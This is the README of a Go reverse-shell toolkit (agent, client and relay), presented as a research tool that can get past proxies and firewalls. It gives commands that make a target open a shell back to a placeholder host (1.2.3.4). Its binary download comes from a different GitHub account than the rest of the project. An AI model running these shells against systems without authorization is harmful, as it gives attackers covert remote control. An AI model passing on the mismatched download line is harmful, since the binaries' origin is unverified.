## A simple reverse-shell written in Go

[![Build Status](https://travis-ci.org/maxlaverse/reverse-shell.svg?branch=master)](https://travis-ci.org/maxlaverse/reverse-shell)
[![Code Coverage](https://codecov.io/gh/maxlaverse/reverse-shell/branch/master/graph/badge.svg)](https://codecov.io/gh/maxlaverse/reverse-shell)


**Disclaimer: This project is for research purposes only, and should only be used on authorized systems.**

---

## Introduction
"A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved." ([source](http://resources.infosecinstitute.com/icmp-reverse-shell/))

A reverse shell is also really useful when you're playing with your SSH server and want to have a backup plan
in case of misconfiguration.

Of course the simplest and most portable way is to use [Netcat](http://nc110.sourceforge.net/).

Here is a some features of this Go implementation:
* good portability
* can cross most proxies and firewalls with default configuration (using websockets, on https, on standard ports)
* auto-reconnection
* supports having multiple shells running on a single agent

This projects contains 3 applications that help you setting and interacting with remote shells:
* an `agent` to be started on the server where you want to open a shell
* a `client` waiting for agent connections and that allow you to interact with the shells
* a `rendezvous` application providing a central point where agents and clients meet when a direct connection is not possible/wanted (not mandatory)

## Installation
Download the binaries
```bash
curl -O -L -s /dev/null https://github.com/MKSx/reverse-shell/releases/download/v0.0.1/reverse-shell-0.0.1-linux-amd64.tar.gz | tar xvz
```

Or build from source
```bash
$ git clone https://github.com/maxlaverse/reverse-shell
$ cd reverse-shell && make
```

## Example of usage
Direct, with TCP:
```bash
# On the client (1.2.3.4)
$ nc 1.2.3.4 7777

# On the target
$ reverse-shell-agent tcp --host=1.2.3.4 --port=7777
```

Direct with Websockets:
```bash
# On the client (1.2.3.4)
$ reverse-shell-client listen --port=7777

# On the target
$ reverse-shell-agent websocket --url=http://1.2.3.4:7777
```

With a rendezvous:
```bash
# On the rendezvous (1.2.3.4)
$  reverse-shell-rendezvous --port=7777

# On the target
$ reverse-shell-agent websocket --url=http://1.2.3.4:7777

# On the client
$ reverse-shell-client rendezvous list-agents --url=http://1.2.3.4:7777
List of agents:
* 3.4.5.6:65000

# Create a session
$ reverse-shell-client rendezvous create-session --url=http://1.2.3.4:7777 3.4.5.6:65000
```

The complete usage is available for each component:
- [agent](docs/agent/reverse-shell-agent.md)
- [client](docs/client/reverse-shell-client.md)
- [rendezvous](docs/rendezvous/reverse-shell-rendezvous.md)

## Todo
* add scp-like commands
* improve logging messages
* read variables from environment
* have agent send its IP  and rendez vous showing the proxy client one
